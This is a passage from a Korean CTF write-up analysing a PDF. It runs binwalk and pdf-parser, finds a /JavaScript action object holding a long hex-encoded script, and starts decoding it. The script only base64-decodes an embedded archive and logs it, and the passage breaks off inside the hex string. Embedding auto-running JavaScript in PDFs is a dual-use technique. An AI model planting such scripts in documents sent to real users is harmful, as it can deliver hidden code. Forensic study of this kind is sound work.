890960        0xD9850         Zlib compressed data, default compression
891071        0xD98BF         Zlib compressed data, default compression
984641        0xF0641         Zlib compressed data, default compression
984758        0xF06B6         Zlib compressed data, default compression
1078796       0x10760C        Zlib compressed data, default compression
```

CTF에서 PDF에 flag를 숨기는 일반적인 방법을 생각해보았습니다.

1. 메타데이터에 숨기기
2. 주석에 숨기기
3. 보이지 않는 텍스트
4. 이미지에 스테가노그래피
5. js 코드 삽입

먼저, PDF의 파일 구조를 분석하기 위해 [pdf-parser.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py)를 실행한다.

```sh
python3 pdf-parser.py confidential.pdf > rex.txt
```

오브젝트 분석 결과에서 수상한 자바스크립트 코드를 발견한다.
```text
obj 4 0
 Type: /Action
 Referencing: 

  <<
    /Type /Action
    /S /JavaScript
    /JS <76617220656E636F646564537472203D20225545734442416F4141414141414141414951442F2F2F2F2F73414541414C414241414151414141415733527959584E6F585338774D4441774C6D526864502F2F2F2F3841414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414146424C417751554141594143414141414345414D4235704777454241414378415141414551415A41475276593142796233427A4C324E76636D557565473173494B49564143696741414141414141414141414141414141414141414141414141477951543076454D42544537344C666F655465704F6E71736C7661374D325467714343313543383751616250795278752F767454574F744654774F4D2B2F4876476B50467A30555A2F424257644D6869697455674246574B744E33364F33316F647968496B52754A422B73675135644961414475373170685775453966447372514D66465951696B55786F684F76514B55625845424C45435451504F43564D4D6F2F57617836543944317858487A77486B68645656756949584C4A497963547348514C456331494B52616B2B2F5244426B68425941414E4A675A434D53572F325168656833385073724E4B616857764C7630303131327A706667326C2F516C714355346A694D654E376C47366B2F4A2B39506A533336315647626153674269307A34657A6D72616C573161737061544E302F4F397068576437696D57337866302F307542332B384C50364F7A4C34414141442F2F774D41554573444242514142674149414B4B446446675870546F3470774141415051414141415541414141643239795A4339335A574A545A5852306157356E637935346257794E6A6B454B776A41515266654364776A5A323151584971564E516151585541395130326B6261444A684A68727839415A303438376C352F50666633583764497434414C46463338687455556F42337542672F64544936365862484753723136733656516C755A34677846797A7979484E466A5A786A444A565362475A7750526359774F647552484A397A4A456D68654E6F445A7A513342333471485A6C7556634553782F7A4963383273507A53306A2B30684451455167504D5763517448353772725A63364F324B4931746B58644568487773524151756C612F636A724E31424C417751554141594143414369673352594E416D69644A494141414451414141414567414141486476636D51765A6D397564465268596D786C4C6E68746249324F545172434D42434639344A334B4C4F3371533545536E383234676E30414347643245417A4532616939666747374146635074376A6531383366754A53765645304D5056777242756F6B427850675A3439504F36337777584759622F723174597A5A61334B6E4C5356487561635532754D75686D6A315A6F5455756B385337533552486B61396A3434764C4A3752615273546B317A4E6F4B4C7A65564B353541554E7472364432316C6D5A4B7751395869467063664C3970414D48526D3078752B554573444242514142674149414B4B44644669524475303130514D414144384E4141415241414141643239795A43396B62324E3162575675644335346257793156383175347A59517668666F4F7869364A3549733233474D32497474306978796142456B32374E4255375246725067446B724C69506655564372544841723374412B7862646673514866354973534D3374623374785349314D39393838334649305664766E6C6A5A57784F6C716544544B4431506F683768574F535572366252542B39767A3862526D396D3333317A566B317A6769684675656844423957524E706C46686A4A7A45736359465955696643306B34474A64434D575267716C5978512B70444A632B775942495A7571416C4E5A75346E79536A4B4D43496156517050676B515A3478694A625259476873794563736C785351386D6768315346346665524D6F753479784969567745467758564F6F476A5A324B4269555744636A3674534C5772477A38616E6C49746C79684775526E706164644335564C4A54445247743765654F4D7A596A726F594C59696E6F4F49735A6369746A41416D435A75394D2B4161664A614D5746464C46684C6F5A4E2F54782F73467447557868446C4C597945686E765255456356386B364A53725A6F764E75657236456C4979664C396C4C707236507A5743424A576A6F53667833614E654A72394E7930586251396D762F7233717450363530746B644C68635758314F79725434774265647538642F3942716E4934777A592B44613159396873674742374873514A537755653275756F695A79456D5A745368314F744C4874574136444F4C45657350495539526A65484B33346B4B6852516C497346693957747166644E685178552B486C6274466442446A41696C6A386630356A702F536F3047473857553837674C315477434338366966647147796F364647735758564B6537413033464C495173457244704942376236533651397859314F4B693774647A6C646E496155645A48477079453974394D4D7267674C6B572F7355377166653255665769494D3336316550536B704A772B5637575655475247464E394F6F5037794D5A6C64783632716A6C413965674E4D616C5841783852344C61384F69464B6F784F436758375636376A4238623432416367442F363939653661376E577A6C626B6A516D58424B6B51562B5457714734464E7A595561557A6877507279365A652F66762B35392B666E503737382B70757467794274336D714B3970694B74317A764338487765646E46635558345648356F4A514256704A664369666D614C50712F4C5273796832786D646A6648694A7635496974707473376D6D3653617938724D3058784A7932796563686A643339786173735A543938536473415162563041366E4379464D4677596369334B697646324C667A616475303276416E784776434B33544C544C46524F4D47576F3945766C5454594552673945477A6A6B476B634D793064354A5372642B67615034502B343752316144574463612B7369525574576F6858355468676A6D4D63436B7974326C796A6875533130482B74533145513943495A3453775A712B762B4A772F5839653537766B7436684B566550746F4E7132477A707062326731354D4378714E78466E615264584271724835416476385A4164665A39434A4A3356596D53774F7A7751442B514E694477437230504664305657795A43344A7941766634693252737661313257394E565A647730435752744F702F33783471393330686951786A4137545341584157726459566933796C7174375142662B7535524656704846453468653670775642624E6E4A6B37556E2F434B63552B495755496477747241344E444D33746A7A6359674E3339465A72394456424C4177515541415941434143696733525966594A477450494341414157435141414477414141486476636D5176633352356247567A4C6E6874624D56577A5737554D42432B492F454F55653574647064535164533071725A5556494B79676C616376593533592F4250734C314E32784F76674152484A473438414739466551686D624B65622F514732456F4A544D76376D66373578736E64774B55567977597A6C57685670663775584A6B7852585849314C644C7A732B4F74522B6E422F76313765303175335A56674E6746395A584E4A693752797273367A7A4E4B4B53574B336463305567424E744A4845676D6D6B6D69586B377137656F6C6A5678664D77466431665A6F4E666254614D6273346B58505A6C77796F34306E556D6D6E4C66504442506755537462386471323370704E764458616C4C58526C466B4C4E556F522F456E43316132622F73364B49386D7030565A50334459556B34574D4D6E51463576326566354D69335963326C5A6F6573516D5A435764527245636D696C4843787875614E506B46455555363171344373777A50454C45316F5A415777475469474C536E7639734C654552517959794D4E326D66454D504C6937454137555432756B314F7464436D4455356D5467666E2F746A4876323742515276334F70775037536F7939435861716D77684B6867784D642B71584569796D7736557539516D54793777556F6257516430705350373070437A53305173767536756146576C4E444A6B61556D506A6D6C7752796472777038673948414D4577484F50733076583475676D67484349344C746A7A315A2F6476766535444D2B4D6C7762594774727552554E357769612B385A764E6B3742465873354535432B377A7234785A4D6948547838485073564A6F397532376E476D545738314D31514B32653061504F4A772B6C4361496D2B5834456A6476526B53624F444C4371652F6C4C78314C636C3168687A73582B58483144724D52534731434B57636C366B4E31382F2F506A3850766E2B3763764E78302F49415561734F37536372494771513258586D564337724F77724361484361397759547A447378782F354E3842634176396F4251536B734A30722F4976376C6F786168695A5933622F6A6F325753502B566C795A53767369734371565846532F613659757263737243627930655265762F7A6D74683849672F6D4533466B4C4E6A4B4E4D4A746B4A784673484D6E7A4C65344A662F362F585A6A6755534277592F466B416E786E48674A4C6D326E35533066796B7543716344584A32356C774E464F73416C65506F45336337312B3731456742654B6F5A2F69302B713269562F435A3648714E77786A5936646F50666A46646B4534555874484C61625257486D384E3737775A4F2F4D35714A6B634D775066727A577A534A35786535645632485247585A4C44694C766952707848472F797A4352766A2F33483266774A5153774D4546414147414167416F6F4E30574F62777A663870427741414E683841414255414141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577A7457553976327A595576772F5964784230642F31506B753267626D484C64724F31615976613764416A49394D5747306F304A4471705552515932754F4141634F36595A6342752B307762437651417274306E795A62683630442B68583253466F533554394B326D5348416B6D4152434C663737306648782F664938584C5678384731446A4555557859324461726C79716D67554F506A556B34625A743352344E53307A52696A7349786F697A4562584F4259394F346575586A6A347A4C614966374F4D414761416A6A486451326663356E4F2B56793745457A69692B784751366862384B69414846346A61626C6359534F51484E417937564B78536B486949536D45614941464E2B615449694844616E53764A496F37314F7745504A594E486730476772564F49655173754F44717043494637464C492B4D513062594A647362736149516663744F674B4F6251305459723867636735555259506937686C472F526F6D6B59794A38314455766F2B4B416D655554542F5A53495A646D5730316B69564D6653714A536C66423353622F536476724D4F57636F697A774F664B4B36364A62766236766273645A676D72783433574F7731657658714E716955563944363276673674766A6442705879436D71745151634446795A6B4731544B4B3669394272577352733231746B476C764949366139424770644F7A477475675574366E4A44785941315A73702B3575634649715057463064794F795A567544526D33645A41614167457A6A57786965734A4276692F594150574452414153454945576368415A667A5041456562434F33767A3431622F6666323738382B4B484E382B2B4D59305A436C6B4D7A5A56615A56437077312F7861386D6E7066656B4171454A4930324E346F71523650446974513550726B6842306F6939694D7834322F7755544A6D61344E74585037393939634A342B2B7235385A4F587830392B4F33373639506A4A723071764143616A544258736F6E43714B386950524B365A62546A49535A6B482F767A6C697A392B2F3772594543534644504436322B642F76587A2B2B7273762F2F37705751477345364639485459694159364E6D2F6A49754D4D4347487342513777667652397935434F69497A76684E455968456C594C375057356E3050645843434B437553374F4F2F356578456B7A794C4174666D4433494347666A546E704D444364542F49416659596F313057465872747575436754644E6F486B364C5355567A5866344F516F64466E46775535754B6D50353942645346464A6C776635345A786D364B516F796B4F4D546445487A7641754D414C39776E4A7A6373653853495773776B3337684F6A693069684330646B50786531475869584244432F69794C6945456335582B37644D37714D466E6D6E68772F7A434669646942594D626F52707A763358304A796A6F4D6A45434156556E3741626950744667786775496B2B5837386363496D694B4B54503659787A4852646862456668484336627243424A3159546A7430555751523053634842545A7549455930784539647544364B4A67565959596B3948584D4A2F45424C41316B33476138434C624838697457764D4E386F7644454D4C70486343364D54702F4637704A706A6D6F57674B4A6E48685845786A584D6375746D754B415468484D7045777067727134464A48792F496D646646446C526A71476135756235505974634A794B4671333533706253644A4C3961304677576A636D48583839366142376578724355743238434C73705A6272743455633475796C6D3639542B2F636E5A532F766E2F693168577436436B695A4258787A683533416D326E756B6D684E4968583142384935596E6F7869712B5867416A51496E76366A67394976437A4964486C576E5348706C3363714270684B514349324C384D384C396F59396D63424155353165304D343258647161784D574D786E41396C6336704F66554E4A444D45706378377373624671725662465678526C5837564C6A6F686E456855376C59686C7535434163797058477078473269306146586635615163474A742B6D386E795A6B425061336F57675A6E34627758724B5942504252745A394B6F4C53492B664D7346584973436C4D716A6B6F594167526D4D34303748634E32433233546473434B4942683953474B78327275515249456C4F2B586753506A3544794453486C36475554774353495A5144594475544344665677696B633169466B51744D597754505341636F434C3846454755493668462B5461435147444A49434D592B32694D6B7A466D41724C357845422F317A68715A5547694D6442586F7644686B6D4D32436F316A6F356E31432B5A624B4A34786B45516D58456C774E4E54544851324E6F3762703147304953772F4E32755945506B7642597A43442B497A46575166524B58796739726849664A41527A3577655A31484D65796A323156524A665371596B6735684A6941635277596C51647355666B6F384B5A756C70796773475667356B6E3231426D6E7441366266677254353464455869537358536E6779775237586730747245624F6C586D5839412F436D4E776E4F524664657A3468454F32774F55545830783066475070314864784345754E326F43756550535178487436716169544742473473305757667876314C517865714742614666424D6851566532497A6E7930724C705A7870577461716C724E7849704C396C54344A6A55626271583936646975364B336E4832526E6B61447672466F5A66734F565258424D586F324650754F6C57774959306C3350636F6A656D6F35313032555672757971646A494D366C56676C793666394B79646D737461363973305462557A72574276764D65532B4F6632642F4958777876786338776B71777969724B56394B757173386F2F633142533245376766357253715446774D674F795661346850565132464D364E444B44784C467373674B3875484769614A416346475A4879546C532F4357583744794446396544475A30374633536767567073677354324572364F776E78374B6A585761744E5A6270656A794F4141675978365274766D6F596E6373743261377055725437706573756C55704E65314F766453783758713162316372765737744D6151653767645657393045442B427A4C31307337344E6C2B397164634A42383862376B7361444D354A31765759355033676C58613576756845666930746330434F544A52303574304B7133756B36705665384D536C617632797931584B6462366A6C756F7A666F7558617A4E586873476F6453324F7255586376704E30744F3158564C6C6C4D52394A757455734F71315470576F39507357783078426D43774D676A7055334247386A39786E3652363554395153774D4546414147414167416F6F4E30574330513363646E4177414172676741414245414141423362334A6B4C334E6C64485270626D647A4C6E6874624A3157323237624F4242395832442F7764427A665575546F424469464768634E2B6B6D33514471747338554E624B4A3843494D4B577664722B2B514643306269644F695436466D7A70793538484363712F662F4B7A6E61416C706839434B625432625A434451336C64447252666266313958345866622B2B752B2F72727263676E4E6B74534F4B30445933693678466E56752B4163587357416D4F787072616A626C5275616C727761482F6B2F5552754D67327A6A5835644E6F48545577446D74687167346F354F7A47346E736249706547744175326D5A37505A355252424D6B66313259316F62474A54663870477154614A5A5074614531736C453636627A3135443975313242717439784F2B5535774D614E42797370636B7147647456544F6845592B5876384D5235336F73534765344F534B3770326E34596F305A643367427947696864385779575856394E6F384D444C4E764349384A575150636F754773526776736C4D3947674D5858686D41506974413149475954434A54437175637658794A5269644E505245706947474A2B7567707131306E316C5A65464D51794662526A322B5331556475304F417349316B75317544346F66526A736B6C736F3679666B4A526653546C37684A48333166314B2F7742365464414A2F687079724D3471703779464E6F546176505961707065454F6F2F674A6F71444E322F374F6879766D484975414D734773594A66454F396F5A47706D6370384D65374771415A4A484C474B4578452B65306C436F6A65383945464669326861586430434931756F3454583379384572593669306B38484A54573151696379464770686B6D6B4E4276556A3473484F774E47305A5439394635546152374A65674C6D38747244376573353170695A6545657653644D685A78473947344E464E416567743169464A493458595070674B7678686246732B657A5831515443756E587A54532B3346364C3834742B336F4779547851715363327133432B5252357050504B336F376B624B4B376D6C556D36594B6C477730594E664E4251335944792B784B635051672F6F456D6A395163524633344171326E49416A73654849484A356E46564D7968554A616344524D6F7241766338447659535855496479396D65567977654736384E79776950613233306B6E6F4430396B414F3965654443767969416678454B6D78694A66536F50334D50374A413164376F692F3144762F507938547A703450565A6F64792F55674C4E745753544336504D6F545276764345624B2F33654C4D572F76334E2B42767A45536B4D54432F327242413273615569734A70567A5046356B5536343262653930342B716F59506F5750636E33572B3836436A3736384C337777376E736C64482F776748676B5648385962472B54376531674F302B32383846326B577758672B30793253363962624F6A6655367239346E6B6E593765586873705451665662544975736D636D5035726E512F43444354766E546E505A566B44367167793364396F7665787443586E5037766334466962485971584C5959704F59374D6A6E4D306C685851454E6255426E6B4F6F4F7677467649766A4946784B6E2F7A797566774A5153774D4546414147414167416F6F4E30574472392B702F72414141415A674D41414277414141423362334A6B4C3139795A57787A4C325276593356745A5735304C6E6874624335795A57787A725A4C4C62734D67454558336C666F5061505931647670515651566E4530584B746E552F674F4478513755424D644E482F723749556C7569657547464E306A33416E664F77477833582B4D67506A425137367943497374426F445775376D3272344C553633447A437272792B326A376A6F446D656F6137334A4F496C53776F365A76386B4A5A6B4F5230325A38326A6A5475504371446E4B304571767A5A7475555737792F4547474E41504B693078787242574559313241714D34656C32533770756B4E377031354839487954416C4A794277626F5A697051347573344D664A496D636B6B476C6238304362565948345047434B4D2B6E6C4D4C6472776E7A69366558664179586D637179374E6245615A376E537077482F66753358576F353076795953782F6C4F63435970703757594A3771594B79712F4156424C41775155414159414341436967335259777432507A2B41414141426E4167414143774141414639795A57787A4C7935795A57787A725A444E61674D784449547668623644385433725451716C6C48687A4B595863536B6B66514E6A61585A503442316C4A30376576794B565A5745716750556F6144642F4D656E4F4F423356437169456E7135644E7178556D6C33314967395566753966466B39353039336672647A77416936614F6F56516C54366C6150544B585A324F71477A464362584C424A4A632B557753576B515A54774F3168514C4E7132306444317836366D33697172626561746E367031653672344E2B385455514744777A475A634A464953456A446C6A46484768417474706E39796272656C453051693038356A726B504E377164727A63393848685333624869496C6E476A42345A6B77652F652B41554D727466412F2F7954644E384E50645A795A76704D424C73486D32535A57312B775A5153774D4546414147414167416F6F4E30574976337A4A4278415141413267554141424D41414142625132397564475675644639556558426C6331307565473173745A544C54734D7745455833535078443543314B334C4A41434358706773655356714A38674F4E4D576F4E6A573762372B6E736D53524F685571684D31553255683333757665504A704A4E744C614D315743653079736734475A4549464E656C5549754D764D3966346E737979612B7630766E4F674974777358495A575870764869683166416B3163346B326F50424C7057334E504437614254574D66374946304E7652364935797254776F482F754751664C30435371326B6A353633754C7254726751696B5350336270474B69504D47436B34382B694C726C563549424C7271684963537331584E6149544C57466166414433694B64372F6C456843394B464B65326A4A4C697A64654F57777267627A48744B716C6E7965365A447742515077596F536F686D7A2F70585657414B4B38575A5747306578474D6E66754E4D6C677162614A5A5378515352594C3242493057766E615839333141585846734A7439505672646764726237517471664D37435335632B61424847685A6D352B4163646E63746B343762483255662F5867524F69506750573639684A55394F63444D426F7133692F6E3542672B774E50794F352F62716A364D61794455544B73425268534E6C7A6772356A373439315430444F73434F7834454A744C324F7A2B376E46764E546E4C616A4F76384355457344424251414267414941414141495142307A74497772774541414A454441414151414141415A47396A55484A7663484D76595842774C6E6874624A7854775737624D4179394639672F474C6F33646F4A684B414C61785A426936474846417352747A35704D32384A73535A42596F2B6E586C376151526C6C336D6B2B506A39545449796E44376573345A4250366F4B3070785870566941794E736F303258536B6536782F584E79494C4A45306A423275774645634D347262366367563762783136306867796C6A436846443252322B5A355544324F4D71773462546A54576A394B34744233755731627266444F71706352446557626F766957347975686162433564682B43496970754A2F70663063617132563934716F2B4F4456645157354A447255657343736A504165786C6836466151783442504676664C484545734F756C6C347034507650424A414C75346F4471785773367A716B30684A2F617343717A45664174586E5A65756E34686B776765486E614464677439676E425163734164323639614F5153452F457A41506370354E5875703252464D744A31516B66565A30472B386E4933496673754163394F6C6D4B54583068413350356646594D4744432B5372577450413270794C38514C5473685472722F4F4D754A62425A65464D52672B63754853333342422B746477762F6350734F6A5737654968574533735A38657634354848706D472F375335396E2F5363387574726553634C543643374A5A4A33506D7671446B79727536627A59684963444C7838623375784A37557A4150632F59442F4F56664E5A30324A78715069666775334E5038512B723170745677522F6B43636550372B5070562B38414141442F2F774D41554573424169304143674141414141414141416841502F2F2F2F2B77415141417341454141424141414141414141414141414141414141414141414141467430636D467A614630764D4441774D43356B59585251537745434C5141554141594143414141414345414D4235704777454241414378415141414551414141414141414141414141414141414465415141415A47396A55484A7663484D76593239795A53353462577851537745434C514155414159414341414141434541463655364F4B63414141443041414141464141414141414141414141414141414141416E41774141643239795A4339335A574A545A5852306157356E6379353462577851537745434C5141554141594143414141414345414E416D69644A49414141445141414141456741414141414141414141414141414141414142414141643239795A43396D623235305647466962475575654731735545734241693041464141474141674141414168414A454F37545852417741415077304141424541414141414141414141414141414141417767514141486476636D51765A47396A6457316C626E517565473173554573424169304146414147414167414141416841483243527254794167414146676B4141413841414141414141414141414141414141417767674141486476636D5176633352356247567A4C6E68746246424C415149744142514142674149414141414951446D384D332F4B516341414459664141415641414141414141414141414141414141414F454C4141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577851537745434C5141554141594143414141414345414C524464783263444141437543414141455141414141414141414141414141414141413945774141643239795A43397A5A5852306157356E6379353462577851537745434C5141554141594143414141414345414F7633366E2B73414141426D41774141484141414141414141414141414141414141445446674141643239795A433966636D56736379396B62324E31625756756443353462577775636D56736331424C415149744142514142674149414141414951444333592F5034414141414763434141414C414141414141414141414141414141414150675841414266636D567363793875636D56736331424C415149744142514142674149414141414951434C3938795163514541414E6F4641414154414141414141414141414141414141414141455A414142625132397564475675644639556558426C633130756547317355457342416930414641414741416741414141684148544F306A4376415141416B514D4141424141414141414141414141414141414141416F786F4141475276593142796233427A4C32467763433534625778515377554741414141414177414441442F416741416742774141414141223B0D0A0D0A66756E6374696F6E206261736536344465636F646528737472297B0D0A2020202072657475726E2061746F6228737472293B0D0A7D0D0A0D0A766172206465636F646564537472203D206261736536344465636F646528656E636F646564537472293B0D0A636F6E736F6C652E6C6F67286465636F64656453747229>
  >>
```

어떤 자바스크립트 코드인지 확인하기 위해 HexString을 바이트 코드로 디코딩한 결과는 아래와 같다.


```py
# 디코딩 스크립트
hexStr="76617220656E636F646564537472203D20225545734442416F4141414141414141414951442F2F2F2F2F73414541414C414241414151414141415733527959584E6F585338774D4441774C6D526864502F2F2F2F3841414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414146424C417751554141594143414141414345414D4235704777454241414378415141414551415A41475276593142796233427A4C324E76636D557565473173494B49564143696741414141414141414141414141414141414141414141414141477951543076454D42544537344C666F655465704F6E71736C7661374D325467714343313543383751616250795278752F767454574F744654774F4D2B2F4876476B50467A30555A2F424257644D6869697455674246574B744E33364F33316F647968496B52754A422B73675135644961414475373170685775453966447372514D66465951696B55786F684F76514B55625845424C45435451504F43564D4D6F2F57617836543944317858487A77486B68645656756949584C4A497963547348514C456331494B52616B2B2F5244426B68425941414E4A675A434D53572F325168656833385073724E4B616857764C7630303131327A706667326C2F516C714355346A694D654E376C47366B2F4A2B39506A533336315647626153674269307A34657A6D72616C573161737061544E302F4F397068576437696D57337866302F307542332B384C50364F7A4C34414141442F2F774D41554573444242514142674149414B4B446446675870546F3470774141415051414141415541414141643239795A4339335A574A545A5852306157356E637935346257794E6A6B454B776A41515266654364776A5A323151584971564E516151585541395130326B6261444A684A68727839415A303438376C352F50666633583764497434414C46463338687455556F42337542672F64544936365862484753723136733656516C755A34677846797A7979484E466A5A786A444A565362475A7750526359774F647552484A397A4A456D68654E6F445A7A513342333471485A6C7556634553782F7A4963383273507A53306A2B30684451455167504D5763517448353772725A63364F324B4931746B58644568487773524151756C612F636A724E31424C417751554141594143414369673352594E416D69644A494141414451414141414567414141486476636D51765A6D397564465268596D786C4C6E68746249324F545172434D42434639344A334B4C4F3371533545536E383234676E30414347643245417A4532616939666747374146635074376A6531383366754A53765645304D5056777242756F6B427850675A3439504F36337777584759622F723174597A5A61334B6E4C5356487561635532754D75686D6A315A6F5455756B385337533552486B61396A3434764C4A3752615273546B317A4E6F4B4C7A65564B353541554E7472364432316C6D5A4B7751395869467063664C3970414D48526D3078752B554573444242514142674149414B4B44644669524475303130514D414144384E4141415241414141643239795A43396B62324E3162575675644335346257793156383175347A59517668666F4F7869364A3549733233474D32497474306978796142456B32374E4255375246725067446B724C69506655564372544841723374412B7862646673514866354973534D3374623374785349314D39393838334649305664766E6C6A5A57784F6C716544544B4431506F683768574F535572366252542B39767A3862526D396D3333317A566B317A6769684675656844423957524E706C46686A4A7A45736359465955696643306B34474A64434D575267716C5978512B70444A632B775942495A7571416C4E5A75346E79536A4B4D43496156517050676B515A3478694A625259476873794563736C785351386D6768315346346665524D6F753479784969567745467758564F6F476A5A324B4269555744636A3674534C5772477A38616E6C49746C79684775526E706164644335564C4A54445247743765654F4D7A596A726F594C59696E6F4F49735A6369746A41416D435A75394D2B4161664A614D5746464C46684C6F5A4E2F54782F73467447557868446C4C597945686E765255456356386B364A53725A6F764E75657236456C4979664C396C4C707236507A5743424A576A6F53667833614E654A72394E7930586251396D762F7233717450363530746B644C68635758314F79725434774265647538642F3942716E4934777A592B44613159396873674742374873514A537755653275756F695A79456D5A745368314F744C4874574136444F4C45657350495539526A65484B33346B4B6852516C497346693957747166644E685178552B486C6274466442446A41696C6A386630356A702F536F3047473857553837674C315477434338366966647147796F364647735758564B6537413033464C495173457244704942376236533651397859314F4B693774647A6C646E496155645A48477079453974394D4D7267674C6B572F7355377166653255665769494D3336316550536B704A772B5637575655475247464E394F6F5037794D5A6C64783632716A6C413965674E4D616C5841783852344C61384F69464B6F784F436758375636376A4238623432416367442F363939653661376E577A6C626B6A516D58424B6B51562B5457714734464E7A595561557A6877507279365A652F66762B35392B666E503737382B70757467794274336D714B3970694B74317A764338487765646E46635558345648356F4A514256704A664369666D614C50712F4C5273796832786D646A6648694A7635496974707473376D6D3653617938724D3058784A7932796563686A643339786173735A543938536473415162563041366E4379464D4677596369334B697646324C667A616475303276416E784776434B33544C544C46524F4D47576F3945766C5454594552673945477A6A6B476B634D793064354A5372642B67615034502B343752316144574463612B7369525574576F6858355468676A6D4D63436B7974326C796A6875533130482B74533145513943495A3453775A712B762B4A772F5839653537766B7436684B566550746F4E7132477A707062326731354D4378714E78466E615264584271724835416476385A4164665A39434A4A3356596D53774F7A7751442B514E694477437230504664305657795A43344A7941766634693252737661313257394E565A647730435752744F702F33783471393330686951786A4137545341584157726459566933796C7174375142662B7535524656704846453468653670775642624E6E4A6B37556E2F434B63552B495755496477747241344E444D33746A7A6359674E3339465A72394456424C4177515541415941434143696733525966594A477450494341414157435141414477414141486476636D5176633352356247567A4C6E6874624D56577A5737554D42432B492F454F55653574647064535164533071725A5556494B79676C616376593533592F4250734C314E32784F76674152484A473438414739466551686D624B65622F514732456F4A544D76376D66373578736E64774B55567977597A6C57685670663775584A6B7852585849314C644C7A732B4F74522B6E422F76313765303175335A56674E6746395A584E4A693752797273367A7A4E4B4B53574B336463305567424E744A4845676D6D6B6D69586B377137656F6C6A5678664D77466431665A6F4E666254614D6273346B58505A6C77796F34306E556D6D6E4C66504442506755537462386471323370704E764458616C4C58526C466B4C4E556F522F456E43316132622F73364B49386D7030565A50334459556B34574D4D6E51463576326566354D69335963326C5A6F6573516D5A435764527245636D696C4843787875614E506B46455555363171344373777A50454C45316F5A415777475469474C536E7639734C654552517959794D4E326D66454D504C6937454137555432756B314F7464436D4455356D5467666E2F746A4876323742515276334F70775037536F7939435861716D77684B6867784D642B71584569796D7736557539516D54793777556F6257516430705350373070437A53305173767536756146576C4E444A6B61556D506A6D6C7752796472777038673948414D4577484F50733076583475676D67484349344C746A7A315A2F6476766535444D2B4D6C7762594774727552554E357769612B385A764E6B3742465873354535432B377A7234785A4D6948547838485073564A6F397532376E476D545738314D31514B32653061504F4A772B6C4361496D2B5834456A6476526B53624F444C4371652F6C4C78314C636C3168687A73582B58483144724D52534731434B57636C366B4E31382F2F506A3850766E2B3763764E78302F49415561734F37536372494771513258586D564337724F77724361484361397759547A447378782F354E3842634176396F4251536B734A30722F4976376C6F786168695A5933622F6A6F325753502B566C795A53767369734371565846532F613659757263737243627930655265762F7A6D74683849672F6D4533466B4C4E6A4B4E4D4A746B4A784673484D6E7A4C65344A662F362F585A6A6755534277592F466B416E786E48674A4C6D326E35533066796B7543716344584A32356C774E464F73416C65506F45336337312B3731456742654B6F5A2F69302B713269562F435A3648714E77786A5936646F50666A46646B4534555874484C61625257486D384E3737775A4F2F4D35714A6B634D775066727A577A534A35786535645632485247585A4C44694C766952707848472F797A4352766A2F33483266774A5153774D4546414147414167416F6F4E30574F62777A663870427741414E683841414255414141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577A7457553976327A595576772F5964784230642F31506B753267626D484C64724F31615976613764416A49394D5747306F304A4471705552515932754F4141634F36595A6342752B307762437651417274306E795A62683630442B68583253466F533554394B326D5348416B6D4152434C663737306648782F664938584C5678384731446A4555557859324461726C79716D67554F506A556B34625A743352344E53307A52696A7349786F697A4562584F4259394F346575586A6A347A4C614966374F4D414761416A6A486451326663356E4F2B56793745457A69692B784751366862384B69414846346A61626C6359534F51484E417937564B78536B486949536D45614941464E2B615449694844616E53764A496F37314F7745504A594E486730476772564F49655173754F44717043494637464C492B4D513062594A647362736149516663744F674B4F6251305459723867636735555259506937686C472F526F6D6B59794A38314455766F2B4B416D655554542F5A53495A646D5730316B69564D6653714A536C66423353622F536476724D4F57636F697A774F664B4B36364A62766236766273645A676D72783433574F7731657658714E716955563944363276673674766A6442705879436D71745151634446795A6B4731544B4B3669394272577352733231746B476C764949366139424770644F7A477475675574366E4A44785941315A73702B3575634649715057463064794F795A567544526D33645A41614167457A6A57786965734A4276692F594150574452414153454945576368415A667A5041456562434F33767A3431622F6666323738382B4B484E382B2B4D59305A436C6B4D7A5A56615A56437077312F7861386D6E7066656B4171454A4930324E346F71523650446974513550726B6842306F6939694D7834322F7755544A6D61344E74585037393939634A342B2B7235385A4F587830392B4F33373639506A4A723071764143616A544258736F6E43714B386950524B365A62546A49535A6B482F767A6C697A392B2F3772594543534644504436322B642F76587A2B2B7273762F2F37705751477345364639485459694159364E6D2F6A49754D4D4347487342513777667652397935434F69497A76684E455968456C594C375057356E3050645843434B437553374F4F2F356578456B7A794C4174666D4433494347666A546E704D444364542F49416659596F313057465872747575436754644E6F486B364C5355567A5866344F516F64466E46775535754B6D50353942645346464A6C776635345A786D364B516F796B4F4D546445487A7641754D414C39776E4A7A6373653853495773776B3337684F6A693069684330646B50786531475869584244432F69794C6945456335582B37644D37714D466E6D6E68772F7A434669646942594D626F52707A763358304A796A6F4D6A45434156556E3741626950744667786775496B2B5837386363496D694B4B54503659787A4852646862456668484336627243424A3159546A7430555751523053634842545A7549455930784539647544364B4A67565959596B3948584D4A2F45424C41316B33476138434C624838697457764D4E386F7644454D4C70486343364D54702F4637704A706A6D6F57674B4A6E48685845786A584D6375746D754B415468484D7045777067727134